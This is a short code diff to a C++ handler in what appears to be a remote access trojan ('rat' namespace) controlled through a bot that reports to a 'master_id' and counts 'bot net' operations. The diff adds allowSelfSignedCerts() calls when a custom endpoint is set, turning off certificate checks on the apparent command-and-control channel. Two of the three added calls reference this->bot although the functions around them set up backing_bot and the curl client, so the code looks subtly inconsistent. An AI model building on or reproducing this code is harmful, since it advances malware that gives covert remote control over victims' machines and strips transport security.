@@ -21,6 +21,9 @@ Handler &Handler::initMainBot(const char *arg_Token) {
 	HANDLER_DEBUG_LOG("instantiating the main bot");
 	this->bot = std::make_unique<::rat::tbot::Bot>(arg_Token, this->master_id,
 	                                               20, this->url_endpoint);
+		if(this->url_endpoint != "") {
+			this->bot->curl_client.allowSelfSignedCerts();
+		}
 	this->bot->sendMessage("This Bot has been initialized");
 	this->bot->setOffset();
 	this->bot_net_ops_counter++;
@@ -31,6 +34,10 @@ Handler &Handler::initBackingBot(const char *arg_Token) {
 	HANDLER_DEBUG_LOG("Istantiating the backing bot");
 	this->backing_bot = std::make_unique<::rat::tbot::BaseBot>(
 	    arg_Token, this->master_id, 20, this->url_endpoint);
+		if(this->url_endpoint != "") {
+			this->bot->curl_client.allowSelfSignedCerts();
+		}
+
 	this->backing_bot->sendMessage("This Bot has been initialized");
 	this->backing_bot_net_ops_counter++;
 	return *this;
@@ -40,6 +47,9 @@ Handler &Handler::initCurlClient(uint8_t Operation_Restart_Bound) {
 	HANDLER_DEBUG_LOG("Istantiating the curl client");
 	this->curl_client =
 	    std::make_unique<::rat::networking::Client>(Operation_Restart_Bound);
+		if(this->url_endpoint != "") {
+			this->bot->curl_client.allowSelfSignedCerts();
+		}
 	this->bot->sendMessage("Handler's Curl client has been initialized");
 	this->bot_net_ops_counter++;
 	return *this;
